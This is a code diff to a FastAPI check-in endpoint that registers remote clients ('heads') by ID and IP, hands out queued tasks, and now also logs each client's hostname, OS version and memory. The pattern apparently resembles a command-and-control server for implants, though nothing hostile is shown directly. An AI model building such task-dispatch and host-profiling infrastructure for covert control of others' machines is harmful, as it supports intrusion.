@@ -40,7 +40,16 @@ app.add_middleware(
 async def checkin(client_id: str, platform: str, request: Request):
     client_ip = request.client.host
     
-    # 1. Register the head in the DB
+    # Strictly necessary: Capture telemetry if sent via POST
+    telemetry = {}
+    if request.method == "POST":
+        try:
+            telemetry = await request.json()
+            print(f"[*] Telemetry from {client_id}: {telemetry.get('hostname')} | {telemetry.get('os_version')} | {telemetry.get('total_memory')}MB RAM")
+        except:
+            pass
+
+    # 1. Register/Update the head in the DB (You can expand register_client to save telemetry later)
     await register_client(client_id, platform, client_ip)
     
     # 2. Check for specific tasks for this ID
